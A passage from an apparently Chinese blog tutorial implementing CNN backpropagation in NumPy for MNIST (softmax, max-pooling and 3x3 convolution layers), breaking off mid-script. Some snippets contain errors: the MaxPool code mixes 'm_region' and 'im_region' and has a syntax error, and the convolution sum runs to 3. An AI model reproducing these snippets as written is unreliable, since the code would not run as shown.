<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Softmax</span>:</span></span><br><span class="line">  <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">backprop</span><span class="params">(self, d_L_d_out)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Performs a backward pass of the softmax layer.</span></span><br><span class="line"><span class="string">    Returns the loss gradient for this layer's inputs.</span></span><br><span class="line"><span class="string">    - d_L_d_out is the loss gradient for this layer's outputs.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="comment"># We know only 1 element of d_L_d_out will be nonzero</span></span><br><span class="line">    <span class="keyword">for</span> i, gradient <span class="keyword">in</span> enumerate(d_L_d_out):</span><br><span class="line">      <span class="keyword">if</span> gradient == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># e^totals</span></span><br><span class="line">      t_exp = np.exp(self.last_totals)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Sum of all e^totals</span></span><br><span class="line">      S = np.sum(t_exp)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Gradients of out[i] against totals</span></span><br><span class="line">      d_out_d_t = -t_exp[i] * t_exp / (S ** <span class="number">2</span>)</span><br><span class="line">      d_out_d_t[i] = t_exp[i] * (S - t_exp[i]) / (S ** <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Gradients of totals against weights/biases/input</span></span><br><span class="line">      d_t_d_w = self.last_input</span><br><span class="line">      d_t_d_b = <span class="number">1</span></span><br><span class="line">      d_t_d_inputs = self.weights</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Gradients of loss against totals</span></span><br><span class="line">      d_L_d_t = gradient * d_out_d_t</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Gradients of loss against weights/biases/input</span></span><br><span class="line">      d_L_d_w = d_t_d_w[np.newaxis].T @ d_L_d_t[np.newaxis]</span><br><span class="line">      d_L_d_b = d_L_d_t * d_t_d_b</span><br><span class="line">      d_L_d_inputs = d_t_d_inputs @ d_L_d_t</span><br><span class="line"></span><br><span class="line">      <span class="comment"># ... to be continued</span></span><br></pre></td></tr></table></figure>
<p>剩下的问题是输出了。我们用<span class="math inline">\(W\)</span>和<span class="math inline">\(b\)</span>的梯度，使用SGD方法更新对应的参数，同时将对<code>input</code>的梯度输出，沿着backfoward方向进行传递：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Softmax</span></span></span><br><span class="line"><span class="class">  # ...</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">  <span class="title">def</span> <span class="title">backprop</span><span class="params">(self, d_L_d_out, learn_rate)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Performs a backward pass of the softmax layer.</span></span><br><span class="line"><span class="string">    Returns the loss gradient for this layer's inputs.</span></span><br><span class="line"><span class="string">    - d_L_d_out is the loss gradient for this layer's outputs.</span></span><br><span class="line"><span class="string">    - learn_rate is a float</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="comment"># We know only 1 element of d_L_d_out will be nonzero</span></span><br><span class="line">    <span class="keyword">for</span> i, gradient <span class="keyword">in</span> enumerate(d_L_d_out):</span><br><span class="line">      <span class="keyword">if</span> gradient == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># e^totals</span></span><br><span class="line">      t_exp = np.exp(self.last_totals)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Sum of all e^totals</span></span><br><span class="line">      S = np.sum(t_exp)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Gradients of out[i] against totals</span></span><br><span class="line">      d_out_d_t = -t_exp[i] * t_exp / (S ** <span class="number">2</span>)</span><br><span class="line">      d_out_d_t[i] = t_exp[i] * (S - t_exp[i]) / (S ** <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Gradients of totals against weights/biases/input</span></span><br><span class="line">      d_t_d_w = self.last_input</span><br><span class="line">      d_t_d_b = <span class="number">1</span></span><br><span class="line">      d_t_d_inputs = self.weights</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Gradients of loss against totals</span></span><br><span class="line">      d_L_d_t = gradient * d_out_d_t</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Gradients of loss against weights/biases/input</span></span><br><span class="line">      d_L_d_w = d_t_d_w[np.newaxis].T @ d_L_d_t[np.newaxis]</span><br><span class="line">      d_L_d_b = d_L_d_t * d_t_d_b</span><br><span class="line">      d_L_d_inputs = d_t_d_inputs @ d_L_d_t</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Update weights / biases</span></span><br><span class="line">      self.weights -= learn_rate * d_L_d_w</span><br><span class="line">      self.biases -= learn_rate * d_L_d_b</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> d_L_d_inputs.reshape(self.last_input_shape)</span><br></pre></td></tr></table></figure>
<p>注意返回的时候我们要调整<code>d_L_d_inputs</code>的性状以吻合最初输入的<code>input</code>的大小。我们来验证一下我们的代码，单独训练一下Softmax层试试看：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Imports and setup here</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(image, label)</span>:</span></span><br><span class="line">  <span class="comment"># Impementation excluded</span></span><br><span class="line">  <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(im, label, lr=<span class="number">.005</span>)</span>:</span></span><br><span class="line">  <span class="string">'''</span></span><br><span class="line"><span class="string">  Completes a full training step on the given image and label.</span></span><br><span class="line"><span class="string">  Returns the cross-entropy loss and accuracy.</span></span><br><span class="line"><span class="string">  - image is a 2d numpy array</span></span><br><span class="line"><span class="string">  - label is a digit</span></span><br><span class="line"><span class="string">  - lr is the learning rate</span></span><br><span class="line"><span class="string">  '''</span></span><br><span class="line">  <span class="comment"># forward</span></span><br><span class="line">  out, loss, acc = forward(im, label)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Calculate initial gradient</span></span><br><span class="line">  gradient = np.zeros(<span class="number">10</span>)</span><br><span class="line">  gradient[label] = <span class="number">-1</span> / out[label]</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Backprop</span></span><br><span class="line">  gradient = softmax.backprop(gradient, lr)</span><br><span class="line">  <span class="comment"># <span class="doctag">TODO:</span> backprop MaxPool2 layer</span></span><br><span class="line">  <span class="comment"># <span class="doctag">TODO:</span> backprop Conv3x3 layer</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> loss, acc</span><br><span class="line"></span><br><span class="line">print(<span class="string">'MNIST CNN initialized!'</span>)</span><br><span class="line"><span class="comment"># Train!</span></span><br><span class="line">loss = <span class="number">0</span></span><br><span class="line">num_correct = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i, (im, label) <span class="keyword">in</span> enumerate(zip(train_images, train_labels)):</span><br><span class="line">  <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> i % <span class="number">99</span> == <span class="number">0</span>:</span><br><span class="line">    print(</span><br><span class="line">      <span class="string">'[Step %d] Past 100 steps: Average Loss %.3f | Accuracy: %d%%'</span> %</span><br><span class="line">      (i + <span class="number">1</span>, loss / <span class="number">100</span>, num_correct)</span><br><span class="line">    )</span><br><span class="line">    loss = <span class="number">0</span></span><br><span class="line">    num_correct = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  l, acc = train(im, label)</span><br><span class="line">  loss += l</span><br><span class="line">  num_correct += acc</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里的训练过程不太规范，是一个个地喂数据，同时计算在训练集上的准确率。</p>
</blockquote>
<p>运行后的输出是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MNIST CNN initialized!</span><br><span class="line">[Step 100] Past 100 steps: Average Loss 2.239 | Accuracy: 18%</span><br><span class="line">[Step 200] Past 100 steps: Average Loss 2.140 | Accuracy: 32%</span><br><span class="line">[Step 300] Past 100 steps: Average Loss 1.998 | Accuracy: 48%</span><br><span class="line">[Step 400] Past 100 steps: Average Loss 1.861 | Accuracy: 59%</span><br><span class="line">[Step 500] Past 100 steps: Average Loss 1.789 | Accuracy: 56%</span><br><span class="line">[Step 600] Past 100 steps: Average Loss 1.809 | Accuracy: 48%</span><br><span class="line">[Step 700] Past 100 steps: Average Loss 1.718 | Accuracy: 63%</span><br><span class="line">[Step 800] Past 100 steps: Average Loss 1.588 | Accuracy: 69%</span><br><span class="line">[Step 900] Past 100 steps: Average Loss 1.509 | Accuracy: 71%</span><br><span class="line">[Step 1000] Past 100 steps: Average Loss 1.481 | Accuracy: 70%</span><br></pre></td></tr></table></figure>
<p>可以看到准确度有了很大的提高，我们的CNN已经开始学习了。</p>
<h2 id="backprop-max-pooling">Backprop: Max Pooling</h2>
<p>Max Pooling层其实没有任何参数，但是我们还是要实现backprop操作以将梯度操作继续向前传导。我们还是从forward开始</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaxPool2</span>:</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, input)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Performs a forward pass of the maxpool layer using the given input.</span></span><br><span class="line"><span class="string">    Returns a 3d numpy array with dimensions (h / 2, w / 2, num_filters).</span></span><br><span class="line"><span class="string">    - input is a 3d numpy array with dimensions (h, w, num_filters)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    self.last_input = input</span><br><span class="line"></span><br><span class="line">    <span class="comment"># More Implementation</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
<p>MaxPool 的正向操作是将输入划分为<span class="math inline">\(2\times 2\)</span>的小格子，每个格子里面输出最大值。那么backprop时，我们则将backprop的输入尺寸加倍，并将梯度值传递到Pooling时最大值所在的位置，其他位置上则为 0。</p>
<p>下面是一个简单的例子：</p>
<p><img src="https://imgs.codewoody.com/uploads/big/e4b4bd71ddd6e51a5686040b9dd067f1.png"></p>
<p>那么backprop的过程为</p>
<p><img src="https://imgs.codewoody.com/uploads/big/001cf17378733ee19156be1278bc3636.png"></p>
<p>代码实现如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaxPool2</span></span></span><br><span class="line"><span class="class">  # ...</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">  <span class="title">def</span> <span class="title">iterate_regions</span><span class="params">(self, image)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Generates non-overlapping 2x2 image regions to pool over.</span></span><br><span class="line"><span class="string">    - image is a 2d numpy array</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    h, w, _ = image.shape</span><br><span class="line">    new_h = h // <span class="number">2</span></span><br><span class="line">    new_w = w // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(new_h):</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> range(new_w):</span><br><span class="line">        m_region = image[(i * <span class="number">2</span>):(i * <span class="number">2</span> + <span class="number">2</span>), (j * <span class="number">2</span>):(j * <span class="number">2</span> + <span class="number">2</span>)]</span><br><span class="line">        <span class="keyword">yield</span> im_region, i, j</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">backprop</span><span class="params">(self, d_L_d_out)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Performs a backward pass of the maxpool layer.</span></span><br><span class="line"><span class="string">    Returns the loss gradient for this layer's inputs.</span></span><br><span class="line"><span class="string">    - d_L_d_out is the loss gradient for this layer's outputs.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    d_L_d_input = np.zeros(self.last_input.shape)</span><br><span class="line">    <span class="keyword">for</span> im region, i, j <span class="keyword">in</span> self.iterate_regions(self.last_input):</span><br><span class="line">      h, w, f = im_region.shape</span><br><span class="line">      amax = np.amax(im_region, axis=(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">      <span class="keyword">for</span> i2 <span class="keyword">in</span> range(h):</span><br><span class="line">        <span class="keyword">for</span> j2 <span class="keyword">in</span> range(w):</span><br><span class="line">          <span class="keyword">for</span> f2 <span class="keyword">in</span> range(f):</span><br><span class="line">            <span class="comment"># If this pixel was the max value, copy the gradient to it</span></span><br><span class="line">            <span class="keyword">if</span> im_region[i2, j2, f2] == amax[f2]:</span><br><span class="line">              d_L_d_input[i * <span class="number">2</span> + i2, j * <span class="number">2</span> + j2, f2] = d_L_d_out[i, j, f2]</span><br><span class="line">    <span class="keyword">return</span> d_L_d_input</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这个实现是循环的，效率太低了。</p>
</blockquote>
<p>Max Pooling的backprop操作到这里就可以了。</p>
<h2 id="backprop-conv">Backprop: Conv</h2>
<p>卷积层的处理是CNN的网络的核心。还是遵循前例，我们从forward阶段的缓存开始：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Conv3x3</span></span></span><br><span class="line"><span class="class">  # ...</span></span><br><span class="line"><span class="class">  <span class="title">def</span> <span class="title">forward</span><span class="params">(self, input)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Performs a forward pass of the conv layer using the given input.</span></span><br><span class="line"><span class="string">    Returns a 3d numpy array with dimensions (h, w, num_filters).</span></span><br><span class="line"><span class="string">    - input is a 2d numpy array</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    self.last_input = input</span><br><span class="line"></span><br><span class="line">    <span class="comment"># More implementation</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>为了简化操作，我们这里假设Conv层的输入的是2维数组（即通道数为1），这是因为这个Conv层在这里是第一层。在更一般的网络中，位于中间的Conv层的输入应该是一个3位数组（多了一个通道维度）。</p>
</blockquote>
<p>我们这里主要关心损失关于Filter的梯度。MaxPool层已经提供了Conv层的<span class="math inline">\(\partial L / \partial o u t\)</span>，所以这里我们只需要计算<span class="math inline">\(\partial o u t / \partial f i l t e r s\)</span>。要理清这个梯度的计算方法，我们首先来考虑这个问题：如果我们修改Filter的参数，这会如何影响到Conv层的输出呢？</p>
<p>事实上修改任意Filter参数都会导致整个输出矩阵（图像）的改变。为了简化问题，我们只考虑输出的一个像素。修改Filter会对一个特定的像素产生什么影响呢？我们来看下面这个非常简单的例子：</p>
<p><img src="https://imgs.codewoody.com/uploads/big/0b9a79552e8bf9951c07d031c8f918c4.png"></p>
<p>我们有一个 <span class="math inline">\(3 \times 3\)</span>的图像，使用一个 <span class="math inline">\(3 \times 3\)</span> 的Filter来产生一个<span class="math inline">\(1 \times 1\)</span>的输出。如果我们将Filter中心的数字修改为1，那么输出会成为：</p>
<p><img src="https://imgs.codewoody.com/uploads/big/5b827a34812d898a22fa9921d2e17ea1.png"></p>
<p>细想不难发现，一个输出像素对于一个Filter元素的微分，正是输入图像对应位置上的像素灰度值。用公式表示是：</p>
<p><span class="math display">\[
\begin{aligned}
\operatorname{out}(\mathrm{i}, \mathrm{j}) &amp;=\text { convolve(image, filter }) \\
&amp;=\sum_{x=0}^{3} \sum_{y=0}^{3} \operatorname{image}(i+x, j+y) * \text { filter }(x, y) \\
&amp; \frac{\partial \operatorname{out}(i, j)}{\partial \operatorname{filter}(x, y)}=\operatorname{image}(i+x, j+y)
\end{aligned}
\]</span></p>
<p>那么对于完整的图像来说，</p>
<p><span class="math display">\[
\frac{\partial L}{\partial \text { filter }(x, y)}=\sum_{i} \sum_{j} \frac{\partial L}{\partial \text { out }(i, j)} * \frac{\partial \text { out }(i, j)}{\partial \text { filter }(x, y)}
\]</span></p>
<p>这样我们就可以做代码实现了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Conv3x3</span></span></span><br><span class="line"><span class="class">  # ...</span></span><br><span class="line"><span class="class">  <span class="title">def</span> <span class="title">iterate_regions</span><span class="params">(self, image)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Generates all possible 3x3 image regions using valid padding.</span></span><br><span class="line"><span class="string">    - image is a 2d numpy array.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    h, w = image.shape</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(h - <span class="number">2</span>):</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> range(w - <span class="number">2</span>):</span><br><span class="line">        im_region = image[i:(i + <span class="number">3</span>), j:(j + <span class="number">3</span>)]</span><br><span class="line">        <span class="keyword">yield</span> im_region, i, j</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">backprop</span><span class="params">(self, d_L_d_out, learn_rate)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Performs a backward pass of the conv layer.</span></span><br><span class="line"><span class="string">    - d_L_d_out is the loss gradient for this layer's outputs.</span></span><br><span class="line"><span class="string">    - learn_rate is a float.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    d_L_d_filters = np.zeros(self.filters.shape)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> im_region, i, j <span class="keyword">in</span> self.iterate_regions(self.last_input):</span><br><span class="line">      <span class="keyword">for</span> f <span class="keyword">in</span> range(self.num_filters):</span><br><span class="line">        d_L_d_filters[f] += d_L_d_out[i, j, f] * im_region</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Update filters</span></span><br><span class="line">    self.filters -= learn_rate * d_L_d_filters</span><br><span class="line"></span><br><span class="line">    <span class="comment"># We aren't returning anything here since we use Conv3x3 as</span></span><br><span class="line">    <span class="comment"># the first layer in our CNN. Otherwise, we'd need to return</span></span><br><span class="line">    <span class="comment"># the loss gradient for this layer's inputs, just like every</span></span><br><span class="line">    <span class="comment"># other layer in our CNN.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br></pre></td></tr></table></figure>
<p>因为Conv层是第一层，所以这里backprop返回的是None。</p>
<h2 id="训练cnn">训练CNN</h2>
<p>至此我们的模型完整了。我们可以用下面的代码来训练模型：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mnist</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> conv <span class="keyword">import</span> Conv3x3</span><br><span class="line"><span class="keyword">from</span> maxpool <span class="keyword">import</span> MaxPool2</span><br><span class="line"><span class="keyword">from</span> softmax <span class="keyword">import</span> Softmax</span><br><span class="line"></span><br><span class="line"><span class="comment"># We only use the first 1k examples of each set in the interest of time.</span></span><br><span class="line"><span class="comment"># Feel free to change this if you want.</span></span><br><span class="line">train_images = mnist.train_images()[:<span class="number">1000</span>]</span><br><span class="line">train_labels = mnist.train_labels()[:<span class="number">1000</span>]</span><br><span class="line">test_images = mnist.test_images()[:<span class="number">1000</span>]</span><br><span class="line">test_labels = mnist.test_labels()[:<span class="number">1000</span>]</span><br><span class="line"></span><br><span class="line">conv = Conv3x3(<span class="number">8</span>)                  <span class="comment"># 28x28x1 -&gt; 26x26x8</span></span><br><span class="line">pool = MaxPool2()                  <span class="comment"># 26x26x8 -&gt; 13x13x8</span></span><br><span class="line">softmax = Softmax(<span class="number">13</span> * <span class="number">13</span> * <span class="number">8</span>, <span class="number">10</span>) <span class="comment"># 13x13x8 -&gt; 10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(image, label)</span>:</span></span><br><span class="line">  <span class="string">'''</span></span><br><span class="line"><span class="string">  Completes a forward pass of the CNN and calculates the accuracy and</span></span><br><span class="line"><span class="string">  cross-entropy loss.</span></span><br><span class="line"><span class="string">  - image is a 2d numpy array</span></span><br><span class="line"><span class="string">  - label is a digit</span></span><br><span class="line"><span class="string">  '''</span></span><br><span class="line">  <span class="comment"># We transform the image from [0, 255] to [-0.5, 0.5] to make it easier</span></span><br><span class="line">  <span class="comment"># to work with. This is standard practice.</span></span><br><span class="line">  out = conv.forward((image / <span class="number">255</span>) - <span class="number">0.5</span>)</span><br><span class="line">  out = pool.forward(out)</span><br><span class="line">  out = softmax.forward(out)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Calculate cross-entropy loss and accuracy. np.log() is the natural log.</span></span><br><span class="line">  loss = -np.log(out[label])</span><br><span class="line">  acc = <span class="number">1</span> <span class="keyword">if</span> np.argmax(out) == label <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> out, loss, acc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(im, label, lr=<span class="number">.005</span>)</span>:</span></span><br><span class="line">  <span class="string">'''</span></span><br><span class="line"><span class="string">  Completes a full training step on the given image and label.</span></span><br><span class="line"><span class="string">  Returns the cross-entropy loss and accuracy.</span></span><br><span class="line"><span class="string">  - image is a 2d numpy array</span></span><br><span class="line"><span class="string">  - label is a digit</span></span><br><span class="line"><span class="string">  - lr is the learning rate</span></span><br><span class="line"><span class="string">  '''</span></span><br><span class="line">  <span class="comment"># Forward</span></span><br><span class="line">  out, loss, acc = forward(im, label)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Calculate initial gradient</span></span><br><span class="line">  gradient = np.zeros(<span class="number">10</span>)</span><br><span class="line">  gradient[label] = <span class="number">-1</span> / out[label]</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Backprop</span></span><br><span class="line">  gradient = softmax.backprop(gradient, lr)</span><br><span class="line">  gradient = pool.backprop(gradient)</span><br><span class="line">  gradient = 